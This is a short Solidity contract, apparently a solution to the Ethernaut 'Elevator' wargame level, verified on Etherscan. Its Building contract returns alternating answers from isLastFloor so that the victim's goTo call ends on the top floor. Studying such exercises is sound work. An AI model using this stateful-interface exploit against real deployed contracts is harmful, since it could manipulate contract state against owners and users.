/**
 *Submitted for verification at Etherscan.io on 2019-02-18
*/

contract Elevator {
  function goTo(uint _floor) view public returns (bool);
}

contract Building {
    Elevator e;
    bool public called;

    constructor (address victim) public {
        e = Elevator(victim);
    }
    
    function isLastFloor(uint) public returns (bool) {
        called = !called;
        return !called;
    }
    
    function attack() public {
        called = true;
        e.goTo(1);
    }

}
